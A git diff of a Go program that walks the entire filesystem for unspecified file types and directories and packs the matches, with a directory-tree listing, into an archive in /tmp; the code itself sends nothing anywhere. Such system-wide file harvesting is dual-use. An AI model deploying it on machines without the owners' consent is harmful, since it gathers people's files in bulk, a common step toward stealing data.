@@ -4,6 +4,10 @@ import (
 	"fmt"
 	"path/filepath"
 	"os"
+	"archive/tar"
+	"log"
+	"io"
+	"compress/gzip"
 )
 
 
@@ -51,16 +55,101 @@ func main() {
 
 
 	fmt.Println("Starting")
+	model.SetOutput("/tmp/")
+
 	go fetchDirectories(directories, &model)
 	fetchFiles(filetypes, &model)
+
 	fmt.Println(len(model.dataLD))
 	fmt.Println(len(model.dirFiles))
 	fmt.Println(len(model.entireStruct))
+
+	mergeOperation(&model)
 }
 
 
 // -- Operations --
+func mergeOperation(m *dataDump) {
+	// Here we are making the final compressed file
+	var denied int
+	var totalBytes int
+	treeLoc := "/tmp/getmytree"
+
+	file, err := os.Create(m.output + "output.tar.gz")
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer file.Close()
+	// Setting up the gzip writer
+	gw := gzip.NewWriter(file)
+	defer gw.Close()
+	tw := tar.NewWriter(gw)
+	defer tw.Close()
+
+	// Adding files
+	for i := range m.dataLD {
+		if err := addFile(tw, m.dataLD[i]); err != nil {
+			denied++
+		}
+	}
+	// Adding directories
+	// You can enable this if you want, but it will take a long time to compress all the files
+	// for i := range m.dirFiles {
+	// 	if err := addFile(tw, m.dirFiles[i]); err != nil {
+	// 		denied++
+	// 	}
+	// }
+	fmt.Printf("Didn't have permissions for %d files\n", denied)
+
+	// Writing the tree structure
+	f, err := os.Create(treeLoc)
+	if err != nil {
+		panic(err)
+	}
+	for i := range m.entireStruct {
+		n3, err := f.WriteString(m.entireStruct[i] + "\n")
+
+		switch {
+		case err != nil:
+			fmt.Println("Writing error in structure, ", err)
+		case err == nil:
+			totalBytes += n3
+		}
+	}
+	if err := addFile(tw, treeLoc); err != nil {
+		fmt.Println("No success in writing the tree to tar")
+	}
+
+	fmt.Println("Done!")
+}
+
+func addFile(tw * tar.Writer, path string) error {
+	file, err := os.Open(path)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+	if stat, err := file.Stat(); err == nil {
+		// now lets create the header as needed for this file within the tarball
+		header := new(tar.Header)
+		header.Name = path
+		header.Size = stat.Size()
+		header.Mode = int64(stat.Mode())
+		header.ModTime = stat.ModTime()
+		// write the header to the tarball archive
+		if err := tw.WriteHeader(header); err != nil {
+			return err
+		}
+		// copy the file data to the tarball
+		if _, err := io.Copy(tw, file); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
 func fetchFiles(filetypes []string, m *dataDump) {
+	// Here we are fetching the important files specified above
 	fmt.Println("Fetching important files")
 	for index, file := range filetypes {
 		files, err := WalkMatch("/", "*" + file, false)
@@ -71,6 +160,7 @@ func fetchFiles(filetypes []string, m *dataDump) {
 }
 
 func fetchDirectories(directories []string, m *dataDump) {
+	// Here we are fetching the important directories specified above
 	fmt.Println("Fetching important directories")
 	for index, _dir := range directories {
 		files, err := WalkMatch(_dir, "*", false)
@@ -91,6 +181,7 @@ func fetchDirectories(directories []string, m *dataDump) {
 }
 
 func WalkMatch(root, pattern string, dir bool) ([]string, error) {
+	// This functions as a gateway for the above 2 functions to access the filesystem
 	var matches []string
 	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
 		// if err != nil {
@@ -126,8 +217,3 @@ func WalkMatch(root, pattern string, dir bool) ([]string, error) {
 	}
 	return matches, nil
 }
-
-
-// The full program will stay private and not pushed here, due to the potential of scammed that way
-// I will keep you updated on the program by sending you videos
-// After everything has been completed, and our transaction has been fullfilled. I will push everything here.
